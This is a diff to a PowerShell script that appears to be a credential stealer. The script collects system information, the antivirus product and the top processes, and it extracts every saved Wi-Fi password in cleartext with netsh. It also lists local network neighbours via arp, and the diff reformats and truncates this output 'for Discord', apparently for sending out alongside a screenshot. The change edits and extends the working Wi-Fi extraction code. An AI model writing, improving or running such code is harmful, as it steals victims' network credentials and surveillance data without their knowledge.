@@ -23,18 +23,28 @@ $BatStatus = if($Bat){ "$($Bat.EstimatedChargeRemaining)% (Battery)" } else { "D
 $AV = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName
 $TopProcs = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 -ExpandProperty Name) -join ", "
 
-# --- WIFI & LOCAL NETWORK (Sanitized Strings) ---
+# --- WIFI EXTRACTION ---
 $WiFiRaw = netsh wlan show prof | Select-String ':\s+(.+)$' | ForEach-Object {
     $name = $_.Matches.Groups[1].Value.Trim()
     $pass = netsh wlan show prof name=$name key=clear | Select-String 'Key Content\s+:\s+(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value }
     if($pass){ "[$name]: $pass" }
 } | Out-String
 
+# --- LOCAL NETWORK MAP ---
 $LocalMapRaw = arp -a | Select-String "dynamic" | Select-Object -First 5 | Out-String
 
-# Pre-format code blocks to avoid hash table errors
-$WiFiFinal = if(![string]::IsNullOrWhiteSpace($WiFiRaw)){ "```" + $WiFiRaw.Trim() + "```" } else { "```No Keys Found```" }
-$NetFinal = if(![string]::IsNullOrWhiteSpace($LocalMapRaw)){ "```" + $LocalMapRaw.Trim() + "```" } else { "```No Neighbors Found```" }
+# --- SANITIZE OUTPUT FOR DISCORD ---
+$WiFiClean = "No Keys Found"
+if ($WiFiRaw) { $WiFiClean = $WiFiRaw.Trim() }
+if ($WiFiClean.Length -gt 800) { $WiFiClean = $WiFiClean.Substring(0,800) }
+
+$NetClean = "No Neighbors Found"
+if ($LocalMapRaw) { $NetClean = $LocalMapRaw.Trim() }
+if ($NetClean.Length -gt 500) { $NetClean = $NetClean.Substring(0,500) }
+
+# Wrap in code blocks
+$WiFiFinal = "```" + $WiFiClean + "```"
+$NetFinal = "```" + $NetClean + "```"
 
 # --- SCREENSHOT ---
 try {
